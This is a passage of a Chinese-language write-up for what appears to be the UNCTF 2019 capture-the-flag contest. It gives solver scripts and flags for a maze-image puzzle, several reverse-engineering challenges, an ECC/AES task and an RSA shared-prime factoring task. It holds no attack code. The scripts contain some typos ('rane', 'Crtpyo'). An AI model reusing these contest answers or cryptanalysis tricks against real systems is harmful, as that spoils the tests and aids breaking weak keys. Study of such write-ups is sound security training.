   walk(mg, x + <span class="number">1</span>, y, ex, ey)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(step)</span>:</span><span class="comment">#也是网上的=。=，后面加了点东西</span></span><br><span class="line">    change_records = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(step) - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (abs(step[i][<span class="number">0</span>] - step[i + <span class="number">1</span>][<span class="number">0</span>]) == <span class="number">0</span> &amp; abs(step[i][<span class="number">1</span>] - step[i + <span class="number">1</span>][<span class="number">1</span>]) == <span class="number">1</span>) <span class="keyword">or</span> (abs(step[i][<span class="number">0</span>] - step[i + <span class="number">1</span>][<span class="number">0</span>]) == <span class="number">1</span> &amp; abs(step[i][<span class="number">1</span>] - step[i + <span class="number">1</span>][<span class="number">1</span>]) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            change_records.append(i + <span class="number">1</span>)</span><br><span class="line">    clip_nums = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> change_records:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">            <span class="keyword">if</span> (abs(step[j][<span class="number">0</span>] - step[i][<span class="number">0</span>]) == <span class="number">0</span> &amp; abs(step[j][<span class="number">1</span>] - step[i][<span class="number">1</span>]) == <span class="number">1</span>) <span class="keyword">or</span> (abs(step[j][<span class="number">0</span>] - step[i][<span class="number">0</span>]) == <span class="number">1</span> &amp; abs(step[j][<span class="number">1</span>] - step[i][<span class="number">1</span>]) == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        clip_nums.append((j, i))</span><br><span class="line"></span><br><span class="line">    rc = []<span class="comment"># 将行走路径计入rc中，并得到step的解密路径</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> clip_nums[::<span class="number">-1</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ((i[<span class="number">0</span>] <span class="keyword">in</span> rc) | (i[<span class="number">1</span>] <span class="keyword">in</span> rc)):</span><br><span class="line">            step = step[:i[<span class="number">0</span>] + <span class="number">1</span>] + step[i[<span class="number">1</span>]:]</span><br><span class="line">        rc += list(range(i[<span class="number">0</span>], i[<span class="number">1</span>]))</span><br><span class="line">    tmp = step[<span class="number">0</span>]<span class="comment">#将解密路径转化成1234的密码（出题人的恶意）</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(step)):</span><br><span class="line">        <span class="keyword">if</span> (tmp[<span class="number">0</span>] &gt; step[i][<span class="number">0</span>]) &amp; (tmp[<span class="number">1</span>] == step[i][<span class="number">1</span>]):</span><br><span class="line">            res += <span class="string">'1'</span></span><br><span class="line">        <span class="keyword">elif</span>(tmp[<span class="number">0</span>] &lt; step[i][<span class="number">0</span>])&amp;(tmp[<span class="number">1</span>] &lt; step[i][<span class="number">1</span>]):</span><br><span class="line">            res += <span class="string">'2'</span></span><br><span class="line">        <span class="keyword">elif</span>(tmp[<span class="number">0</span>] == step[i][<span class="number">0</span>])&amp;(tmp[<span class="number">1</span>] &gt; step[i][<span class="number">1</span>]):</span><br><span class="line">            res += <span class="string">'3'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="string">'4'</span></span><br><span class="line">        tmp = step[i]</span><br><span class="line">    out = <span class="string">''</span><span class="comment"># 因为矩阵转化会多出来一位数，所以我们只取奇数位（偶数也行）</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(res)/<span class="number">2</span>)):</span><br><span class="line">        out+=res[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    print(<span class="string">'Over!!!!'</span>)</span><br><span class="line">    print(out)</span><br><span class="line">    files = os.listdir(<span class="string">'.'</span>)<span class="comment">#系统解压zip，网上找了个改了一下（我好水啊）</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">        file = os.path.splitext(filename)</span><br><span class="line">        <span class="keyword">if</span> file[<span class="number">1</span>] == <span class="string">'.jpg'</span>:</span><br><span class="line">            newname = file[<span class="number">0</span>] + <span class="string">'.zip'</span></span><br><span class="line">            os.rename(filename, newname)</span><br><span class="line">    cmd = <span class="string">'unzip -P '</span> + out + <span class="string">' flag.zip'</span></span><br><span class="line">    os.system(cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图形矩阵化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">black</span><span class="params">(c)</span>:</span>  <span class="comment">#黑色边框判断</span></span><br><span class="line">    <span class="keyword">if</span> c[<span class="number">0</span>] &lt;= <span class="number">25</span> <span class="keyword">and</span> c[<span class="number">1</span>] &lt;= <span class="number">25</span> <span class="keyword">and</span> c[<span class="number">2</span>] &lt;= <span class="number">25</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(c, y, x)</span>:</span> <span class="comment">#起点判断</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (abs(c[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">0</span>] - <span class="number">196</span>) &lt;= <span class="number">25</span>) <span class="keyword">and</span> (abs(c[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">1</span>] - <span class="number">46</span>) &lt;= <span class="number">25</span>) <span class="keyword">and</span> (abs(c[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">2</span>] - <span class="number">35</span>) &lt;= <span class="number">25</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">end</span><span class="params">(c, y, x)</span>:</span> <span class="comment">#终点判断</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">if</span> (abs(c[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">0</span>] - <span class="number">255</span>) &lt;= <span class="number">25</span>) <span class="keyword">and</span> (abs(c[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">1</span>] - <span class="number">210</span>) &lt;= <span class="number">25</span>) <span class="keyword">and</span> (abs(c[y+i<span class="number">-3</span>][x+j<span class="number">-3</span>][<span class="number">2</span>] - <span class="number">81</span>) &lt;= <span class="number">25</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">block_size</span><span class="params">(imgz, size)</span>:</span> <span class="comment">#像素大小</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> black(imgz[i][i]):</span><br><span class="line">            ans = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    block = size[<span class="number">0</span>] // ans</span><br><span class="line">    <span class="keyword">return</span> block</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maze</span><span class="params">(img,size)</span>:</span><span class="comment"># 图像矩阵化</span></span><br><span class="line">    maze = []</span><br><span class="line">    block = block_size(img, size)</span><br><span class="line">    truely = size[<span class="number">0</span>] // block</span><br><span class="line">    x1 = (size[<span class="number">0</span>] // truely) * <span class="number">2</span></span><br><span class="line">    y1 = (size[<span class="number">1</span>] // truely) * <span class="number">2</span></span><br><span class="line">    start_y = <span class="number">0</span></span><br><span class="line">    end_y = <span class="number">0</span></span><br><span class="line">    start_x = <span class="number">0</span></span><br><span class="line">    end_x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y2 <span class="keyword">in</span> range(y1):</span><br><span class="line">        line = []</span><br><span class="line">        y = int(y2 * (truely / <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">for</span> x2 <span class="keyword">in</span> range(x1):</span><br><span class="line">            x = int(x2 * (truely / <span class="number">2</span>))</span><br><span class="line">            <span class="keyword">if</span> black(img[y][x]):</span><br><span class="line">                line.append(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> start(img, y, x):</span><br><span class="line">                start_y = y2</span><br><span class="line">                start_x = x2</span><br><span class="line">            <span class="keyword">if</span> end(img, y, x):</span><br><span class="line">                end_y = y2</span><br><span class="line">                end_x = x2</span><br><span class="line">                <span class="keyword">if</span> y2 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    end_y -= <span class="number">1</span></span><br><span class="line">        maze.append(line)</span><br><span class="line">    walk(maze, start_y, start_x, end_y, end_x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: <span class="comment"># 主函数</span></span><br><span class="line">    img = np.array(Image.open(<span class="string">'flag.jpg'</span>).convert(<span class="string">'RGBA'</span>))</span><br><span class="line">    maze(img, (len(img[<span class="number">0</span>]), len(img)))</span><br></pre></td></tr></table></figure>

<p>​        最后再加个死循环脚本让他自己动，解压到最后就是flag.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    python maze.py</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h4 id="flag-17"><a href="#flag-17" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;af810046166d7b8a9c87227fcf341290&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><hr>
<h2 id="奇怪的数组"><a href="#奇怪的数组" class="headerlink" title="奇怪的数组"></a>奇怪的数组</h2><h4 id="Description-18"><a href="#Description-18" class="headerlink" title="Description"></a>Description</h4><p>​         unctf_奇怪的数组 </p>
<h4 id="Analyze-18"><a href="#Analyze-18" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        直接丢IDA</p>
<p><img src="https://i.loli.net/2019/10/30/oLfMmCwRGQgFVOl.jpg" alt></p>
<p><img src="https://i.loli.net/2019/10/30/zyTg4KSoh5N6WJl.jpg" alt></p>
<p>​        发现其实就是判断输入是不是<code>0-9a-f</code>这里面的值，然后在和checkbox栈里的值比较</p>
<p><img src="https://i.loli.net/2019/10/30/RM1Zuw3ix7ElLK4.jpg" alt></p>
<h4 id="Solve-18"><a href="#Solve-18" class="headerlink" title="Solve"></a>Solve</h4><p>​        然后其实里面的值就是flag=。=</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">'flag&#123;'</span></span><br><span class="line">s = <span class="string">'ad461e203c7975b35e527960cbfeb06c&#125;'</span></span><br><span class="line">flag = s1+s</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h4 id="flag-18"><a href="#flag-18" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ad461e203c7975b35e527960cbfeb06c&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="unctf-easy-Maze"><a href="#unctf-easy-Maze" class="headerlink" title="unctf_easy_Maze"></a>unctf_easy_Maze</h2><h4 id="Description-19"><a href="#Description-19" class="headerlink" title="Description"></a>Description</h4><p>​         unctf_easy_Maze </p>
<h4 id="Analyze-19"><a href="#Analyze-19" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        复杂的IDA使我选择动调，在step1后加断点，然后查看RDX的内存，得到迷宫</p>
<p><img src="https://i.loli.net/2019/10/30/dSlbrtWP86IcVnC.jpg" alt></p>
<p>之后直接走迷宫</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1001111</span><br><span class="line">1011001</span><br><span class="line">1110111</span><br><span class="line">0001100</span><br><span class="line">1111000</span><br><span class="line">1000111</span><br><span class="line">1111101</span><br></pre></td></tr></table></figure>

<h4 id="Solve-19"><a href="#Solve-19" class="headerlink" title="Solve"></a>Solve</h4><p>​        然后可以通过程序验证flag，只有两个解，一个是<code>ssddwdwdddssaasasaaassddddwdds</code>，一个是<code>waasaaaawwdddwdwddwwaaasasaaww</code>,最后得到flag</p>
<h4 id="flag-19"><a href="#flag-19" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;ssddwdwdddssaasasaaassddddwdds&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="666"><a href="#666" class="headerlink" title="666"></a>666</h2><h4 id="Description-20"><a href="#Description-20" class="headerlink" title="Description"></a>Description</h4><p>​         答案提交flag{}括号内的值。 </p>
<h4 id="Analyze-20"><a href="#Analyze-20" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        丢进IDA,分析得到他的encode函数，然后解密即可</p>
<p><img src="https://i.loli.net/2019/10/30/mratsdL7OY4HnTM.jpg" alt></p>
<h4 id="Solve-20"><a href="#Solve-20" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a2 + i = (a1[i] + 6) ^ key</span></span><br><span class="line"><span class="string">a2 + i + 1 = (a1[i + 1] - 6) ^ key</span></span><br><span class="line"><span class="string">a2 + i + 2 = a1[i + 2] ^ 6 ^ key</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">enflag = <span class="string">'''izwhroz""w"v.K".Ni'''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    flag += chr((ord(enflag[<span class="number">3</span>*i])^<span class="number">18</span>)<span class="number">-6</span>)</span><br><span class="line">    flag += chr((ord(enflag[<span class="number">3</span>*i+<span class="number">1</span>])^<span class="number">18</span>)+<span class="number">6</span>)</span><br><span class="line">    flag += chr((ord(enflag[<span class="number">3</span>*i+<span class="number">2</span>])^<span class="number">18</span>)^<span class="number">6</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h4 id="flag-20"><a href="#flag-20" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;b66_6b6_66b&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h2><h4 id="Description-21"><a href="#Description-21" class="headerlink" title="Description"></a>Description</h4><p>​         答案提交flag{}括号内的值。 </p>
<h4 id="Analyze-21"><a href="#Analyze-21" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        文件加了壳，随便找了个去壳机去了壳硬IDA分析，然后得到大概是三段加密，所以变成三段解密</p>
<p><img src="https://i.loli.net/2019/10/30/cvxAg1aXWjP9JL4.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1 =i^s1[i]</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/30/CdbX5rnozZk91Vi.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2 = s1[i]^s2[i]^s1[i-1]</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/30/nTizZcSQ8x36jeV.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = s3[i+1]^ord(v2[i])^i</span><br></pre></td></tr></table></figure>

<p>​        然后读取栈中的数据解密</p>
<p><img src="https://i.loli.net/2019/10/30/bn6Dx732BX9NTdy.jpg" alt></p>
<h4 id="Solve-21"><a href="#Solve-21" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0x66</span>,<span class="number">0x6D</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x7F</span>,<span class="number">0x37</span>,<span class="number">0x35</span>,<span class="number">0x30</span>,<span class="number">0x30</span>,<span class="number">0x6B</span>,<span class="number">0x3A</span>,<span class="number">0x3C</span>,<span class="number">0x3B</span>,<span class="number">0x20</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">v1 =i^s1[i]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">s2 = [<span class="number">0x37</span>,<span class="number">0x6F</span>,<span class="number">0x38</span>,<span class="number">0x62</span>,<span class="number">0x36</span>,<span class="number">0x7C</span>,<span class="number">0x37</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x76</span>,<span class="number">0x33</span>,<span class="number">0x62</span>,<span class="number">0x64</span>,<span class="number">0x7a</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">v2 = s1[i]^s2[i]^s1[i-1]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">s3 = [<span class="number">0x1a</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x51</span>,<span class="number">0x5</span>,<span class="number">0x11</span>,<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x59</span>,<span class="number">0x1D</span>,<span class="number">0x9</span>,<span class="number">0x5D</span>,<span class="number">0x12</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">v3 = s3[i+1]^ord(v2[i])^i</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line">flag2 = <span class="string">''</span></span><br><span class="line">flag3 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s1)):</span><br><span class="line">    f = chr(s1[i]^i)</span><br><span class="line">    flag1 += f</span><br><span class="line">print(flag1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s2)):</span><br><span class="line">    <span class="keyword">if</span> i ==<span class="number">0</span>:</span><br><span class="line">        f = chr(s1[i]^s2[i]^s1[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = chr(s1[i]^s2[i]^s1[i<span class="number">-1</span>])</span><br><span class="line">    flag2 += f</span><br><span class="line">print(flag2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s3)<span class="number">-1</span>):</span><br><span class="line">    f = chr(s3[i+<span class="number">1</span>]^ord(flag2[i])^i)</span><br><span class="line">    flag3 += f</span><br><span class="line">print(flag3)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag = flag1+flag2+flag3</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h4 id="flag-21"><a href="#flag-21" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2378b077-qd6e-4564-bdca-7eec8eede9a2&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><hr>
<h2 id="AES和ECC基础"><a href="#AES和ECC基础" class="headerlink" title="AES和ECC基础"></a>AES和ECC基础</h2><h4 id="Description-22"><a href="#Description-22" class="headerlink" title="Description"></a>Description</h4><p>​        post flag到<a href="http://132.232.125.125" target="_blank" rel="noopener">http://132.232.125.125</a></p>
<h4 id="Analyze-22"><a href="#Analyze-22" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        开始得了个AES和ECC.sage，但是AES就是简单解密，却少条件，条件在ECC中，然后ECC已知条件挺多的，把k爆破出来以后就可以得到aes_key，最后AES解密即可</p>
<h4 id="Solve-22"><a href="#Solve-22" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ECC</span></span><br><span class="line"><span class="keyword">import</span> sage</span><br><span class="line">E=EllipticCurve(GF(<span class="number">15424654874903</span>),[<span class="number">16546484</span>,<span class="number">4548674875</span>])</span><br><span class="line">G=E(<span class="number">6478678675</span>, <span class="number">5636379357093</span>)</span><br><span class="line">K=E(<span class="number">2854873820564</span>,<span class="number">9226233541419</span>)</span><br><span class="line">X=G</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rane(<span class="number">1</span>,n):</span><br><span class="line">	<span class="keyword">if</span> X == K:</span><br><span class="line">		k = i</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"[+]k："</span>,i</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		X = X+G</span><br><span class="line">		<span class="keyword">print</span> i</span><br><span class="line"><span class="comment">#k=2019813</span></span><br><span class="line">c1 = E([<span class="number">6860981508506</span>,<span class="number">1381088636252</span>])</span><br><span class="line">c2 = E([<span class="number">1935961385155</span>,<span class="number">8353060610242</span>])</span><br><span class="line">m = c1 - (c2 * k)</span><br><span class="line">aes_key = m[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#aes_key=1026</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># AES</span></span><br><span class="line"><span class="keyword">from</span> Crtpyo.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = bytes(<span class="string">'1026'</span>.ljust(<span class="number">16</span>,<span class="string">' '</span>))</span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'/cM8Nx+iAidmt6RiqX8Vww=='</span></span><br><span class="line">text = aes.decrypt(text)</span><br><span class="line"><span class="comment">#text = this_is_a_flag</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/10/30/xIlPdTaKAqC5tn6.jpg" alt></p>
<h4 id="flag-22"><a href="#flag-22" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">401E48C9A96DC219C32AB5E75204B655</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="不仅仅是RSA"><a href="#不仅仅是RSA" class="headerlink" title="不仅仅是RSA"></a>不仅仅是RSA</h2><h4 id="Description-23"><a href="#Description-23" class="headerlink" title="Description"></a>Description</h4><p>​         It’s not only RSA. 答案提交flag{}括号内的值。 </p>
<h4 id="Analyze-23"><a href="#Analyze-23" class="headerlink" title="Analyze"></a>Analyze</h4><p>​        恶魔出题人两分钟的莫斯密码（出来挨打！！！），然后得到c1，c2，其他均可用openssl或计算获得</p>
<h4 id="Solve-23"><a href="#Solve-23" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b!=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">c1=mpz(<span class="number">4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351</span>)</span><br><span class="line">c2=mpz(<span class="number">485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349</span>)</span><br><span class="line">n11 = <span class="string">'C461B3ED566F2D68583019170BDD5263D113BAECE3DEE6631F08A166376AC41FF5D4E90B3330E0FC26993E3B353F38F9B6B880DFBC5807636497561B7611047B'</span></span><br><span class="line">n1 = mpz(int(n11,<span class="number">16</span>))</span><br><span class="line">n22 = <span class="string">'A36E3A2A83FE2C1E33F285A08C3ECD36E377F4D9FFE828E2426D3ECED0A7F947631E932AEC327555511AC6D71E72686C1CB7DBBF3859A4D9A3D344FBF12A9553'</span></span><br><span class="line">n2 = mpz(int(n22,<span class="number">16</span>))</span><br><span class="line">q = gcd(n1,n2)</span><br><span class="line">p1 = n1/q</span><br><span class="line">p2 = n2/q</span><br><span class="line">e = mpz(<span class="number">41221</span>)</span><br><span class="line">ni1 = (p1<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">ni2 = (p2<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d1 = gmpy2.invert(e,ni1)</span><br><span class="line">d2 = gmpy2.invert(e,ni2)</span><br><span class="line"></span><br><span class="line">m1 = pow(c1,d1,n1)</span><br><span class="line">m2 = pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line">print(m1,m2)</span><br><span class="line"></span><br><span class="line">m11 = hex(int(m1)).replace(<span class="string">'0x'</span>,<span class="string">''</span>).replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">m22 = hex(int(m2)).replace(<span class="string">'0x'</span>,<span class="string">''</span>).replace(<span class="string">'L'</span>,<span class="string">''</span>)</span><br><span class="line">print(bytearray.fromhex(m11)+bytearray.fromhex(m22))</span><br></pre></td></tr></table></figure>

